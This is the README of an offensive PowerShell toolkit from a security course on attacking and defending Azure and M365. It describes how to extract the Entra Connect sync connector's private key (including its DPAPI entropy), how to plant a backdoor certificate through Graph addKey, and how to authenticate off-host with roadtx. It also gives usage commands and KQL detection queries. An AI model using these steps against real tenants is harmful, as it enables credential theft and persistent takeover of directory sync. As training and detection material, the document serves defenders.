# EntraConnectAbuse

Scripts used in the module "Entra Connect Abuse" from the XINTRA Course - Attacking and Defending Azure & M365

PowerShell tooling to steal or plant the Microsoft Entra Connect sync connector's application
certificate, so you can authenticate as the connector against the sync API
(`ADSynchronization.ReadWrite.All`).

> Authorised use only. These scripts steal and plant application credentials against a Microsoft
> Entra tenant. Run them only against tenants and hosts you own or are explicitly authorised to test.

---

## Background: why there is a certificate to steal

Since Entra Connect 2.5.76 the sync engine no longer signs in with a `Sync_<host>` user account.
The installer registers an application (`ConnectSyncProvisioning_<host>`) and authenticates it with
a client certificate. That certificate is the connector's identity; it holds the app role
`ADSynchronization.ReadWrite.All` against the sync SOAP API (`adminwebservice.microsoftonline.com`,
audience `6bf85cfa-ac8a-4be5-b5de-425a0d0dc016`), which is enough to push directory objects and
password hashes into the cloud.

The certificate's private key is a non-exportable CNG key owned by the ADSync standalone Managed
Service Account (sMSA). Steal or reuse that key and you are the connector.

This kit has two paths against that key:

| Path | Script | Idea | Works on a TPM host | Noise |
|------|--------|------|---------------------|-------|
| A (steal existing) | `Extract-EntraConnectCertificate.ps1` | DPAPI-decrypt the CNG key off disk into a portable `.pfx` | No (key is chip-bound) | Stealthy: no tenant change, only an IP mismatch in sign-in logs |
| B (create new) | `Add-EntraConnectCertificate.ps1` | Use the existing key once to `addKey` a second cert you control | Yes (key never leaves host) | Loud: connector app ends with two keys |

Both scripts auto-discover what they need when run on the Connect host (the connector cert, the
AppId and the tenant). You only supply values for the off-host variants.

---

## Path A: `Extract-EntraConnectCertificate.ps1`

Run on the Connect host as administrator or SYSTEM. It checks the host TPM, impersonates
`miiserver.exe`, auto-discovers the connector certificate in the sMSA store, verifies the key's CNG
provider is software-backed (not TPM), DPAPI-decrypts the private-key blob (Software-KSP entropy
`xT5rZW5qVVbrvpuA`), rebuilds the CRT parameters, and writes a portable `.pfx`.

```powershell
# No arguments needed, it finds the connector cert itself:
.\Extract-EntraConnectCertificate.ps1 -OutPfx C:\Tools\connector.pfx
# -> C:\Tools\connector.pfx  (password: Stolen!Lab)
```

`-Thumbprint` is optional; supply it only to disambiguate if the sMSA store holds more than one
certificate with a private key. Copy `connector.pfx` to the attacker machine and authenticate as
the connector from any IP (see "Using the certs off-host" below).

On a TPM-backed host the key is sealed in the chip and cannot be exported. The script detects this
from the key's CNG provider (`Microsoft Platform Crypto Provider`) and stops with a clear message
instead of a cryptic DPAPI failure. Use Path B instead: signing in place never exports the key, so
it works against a TPM.

---

## Path B: `Add-EntraConnectCertificate.ps1`

Generates a new attacker certificate and appends it to the connector app via Graph `addKey`. The
`addKey` action only requires a proof-of-possession JWT signed by an existing key: no directory
role, no admin consent. Possession of the current key is the authorisation.

On the Connect host it needs no arguments. It auto-discovers the connector cert, the AppId and the
tenant, signs the proof in place, and addresses `addKey` by AppId (so no ObjectId is needed):

```powershell
# On the Connect host, as administrator or SYSTEM:
.\Add-EntraConnectCertificate.ps1
# -> .\backdoor.pfx  (password: Passw0rd!Lab, subject CN=backdoor certificate)
```

Off-host, or with explicit values:

```powershell
# Sign the proof with a stolen .pfx from Path A:
.\Add-EntraConnectCertificate.ps1 -Tenant contoso.onmicrosoft.com -AppId <connectorAppId> `
    -SignerPfx C:\Tools\connector.pfx -SignerPfxPassword 'Stolen!Lab'

# Cloud: bring a token that can already write the app (Application Administrator or owner):
.\Add-EntraConnectCertificate.ps1 -AppId <connectorAppId> -ConnectorToken <graphAccessToken>
```

Change `-Subject` to blend with the genuine cert name.

---

## Using the certs off-host (roadtx)

Both outputs, the stolen `connector.pfx` (Path A) and the planted `backdoor.pfx` (Path B), are
valid `keyCredentials` on the connector app, so any client that does the OAuth2 client-credentials
plus certificate (private_key_jwt) flow can use them.
[roadtx](https://github.com/dirkjanm/ROADtools) `appauth` does exactly that:

```bash
pip install roadtx

# Authenticate as the connector against the sync API.
# roadtx has no friendly alias for the sync API, so pass the resource GUID directly:
roadtx appauth \
    -c <connectorAppId> -t <tenant> \
    -r 6bf85cfa-ac8a-4be5-b5de-425a0d0dc016 \
    --cert-pfx connector.pfx --pfx-pass 'Stolen!Lab'
#   (backdoor cert: --cert-pfx backdoor.pfx --pfx-pass 'Passw0rd!Lab')

# -s scope form works too:
roadtx appauth -c <connectorAppId> -t <tenant> \
    -s 6bf85cfa-ac8a-4be5-b5de-425a0d0dc016/.default \
    --cert-pfx connector.pfx --pfx-pass 'Stolen!Lab'
```

`appauth` performs client-credentials with the certificate as the client assertion. From the
attacker's IP the sign-in lands in `AADServicePrincipalSignInLogs` under the connector's own
credential keyId.

Caveat: the connector app carries the sync-API role, not Microsoft Graph app roles. A token for
`-r https://graph.microsoft.com` issues but carries no directory permissions (Graph directory ops
return 403). Point roadtx at the sync API resource above, not Graph.

---

## Detection

| Signal | Catches |
|--------|---------|
| Connector sign-in from an unexpected IP for its credential keyId | Path A: a legitimate keyId authenticating off-host, which the key-count hunt misses |
| Key count on the connector app (`keyCredentials` length greater than 1) | Path B: the planted cert is a new credential |

Key-count baseline (Microsoft Graph). A healthy connector app has exactly one `keyCredential`:

```
GET https://graph.microsoft.com/v1.0/applications?$filter=startsWith(displayName,'ConnectSyncProvisioning')&$select=id,displayName,keyCredentials
```

Path A, the connector credential signing in from an unexpected IP (`AADServicePrincipalSignInLogs`).
Service-principal sign-ins are app-only (no user agent), so the IP plus credential keyId are the
signal:

```kql
let knownConnectHostIPs = dynamic(["200.0.200.10"]);   // your Connect host's egress IP(s)
AADServicePrincipalSignInLogs
| where TimeGenerated > ago(30d)
| where ServicePrincipalName has "ConnectSyncProvisioning"   // or: AppId == "<connectorAppId>"
| where ResultType == 0                                       // successful
| where IPAddress !in (knownConnectHostIPs)
| project TimeGenerated, ServicePrincipalName, AppId,
          ServicePrincipalCredentialKeyId, IPAddress, ResourceDisplayName
| order by TimeGenerated desc
```

Path B, a certificate was added to the connector app (`AuditLogs`):

```kql
AuditLogs
| where TimeGenerated > ago(30d)
| where OperationName has "application" and OperationName has_any ("certificate", "key", "credential")
| mv-expand target = TargetResources
| where tostring(target.displayName) has "ConnectSyncProvisioning"   // or match the app id
| project TimeGenerated, OperationName,
          actor = tostring(InitiatedBy.user.userPrincipalName), app = tostring(target.displayName)
| order by TimeGenerated desc
```

---

## References

### Microsoft: Entra Connect and sync
- What is Microsoft Entra Connect (overview): https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-azure-ad-connect
- Accounts and permissions: https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions
- ADSync service account: https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account
- Version history (2.5.76 app-based auth): https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-version-history
- Prerequisites and server hardening: https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-install-prerequisites
- Entra Connect FAQ: https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-faq

### Microsoft: Graph credentials and detection
- application addKey: https://learn.microsoft.com/en-us/graph/api/application-addkey?view=graph-rest-1.0
- servicePrincipal addKey: https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addkey?view=graph-rest-1.0
- Key-rollover proof-of-possession token: https://learn.microsoft.com/en-us/graph/application-rollkey-prooftoken
- keyCredential resource type: https://learn.microsoft.com/en-us/graph/api/resources/keycredential
- AADServicePrincipalSignInLogs table reference: https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/aadserviceprincipalsigninlogs

### Research and tooling
- Nestori Syynimaa, Decrypting ADSync passwords: my journey into DPAPI (AADInternals): https://aadinternals.com/post/adsync/
- AADInternals: https://aadinternals.com/
- Gerenios/AADInternals: https://github.com/Gerenios/AADInternals
- Dirk-jan Mollema, Azure AD Connect for Red Teamers: https://dirkjanm.io/azure-ad-connect-for-red-teamers/
- Dirk-jan Mollema, Updating adconnectdump: a journey into DPAPI: https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/
- dirkjanm/adconnectdump: https://github.com/dirkjanm/adconnectdump
- Dirk-jan Mollema, Introducing ROADtools Token eXchange (roadtx): https://dirkjanm.io/introducing-roadtools-token-exchange-roadtx/
- dirkjanm/ROADtools: https://github.com/dirkjanm/ROADtools
- ROADtools (roadtx) appauth wiki: https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx)
- Andy Robbins (SpecterOps), Azure Privilege Escalation via Service Principal Abuse: https://specterops.io/blog/2021/10/12/azure-privilege-escalation-via-service-principal-abuse
- Rich (happycamper84), Dumping Creds from Azure AD Connect: https://happycamper84.medium.com/dumping-creds-from-azure-ad-connect-2484de299f63
- imp hash, Shooting Up: On-Prem to Cloud, Detecting "AADConnect" Creds Dump: https://imphash.medium.com/shooting-up-on-prem-to-cloud-detecting-aadconnect-creds-dump-422b21128729
- Nicola Suter, Entra Connect Account Hardening: https://nicolasuter.medium.com/entra-connect-hardening-61ed8ebca094
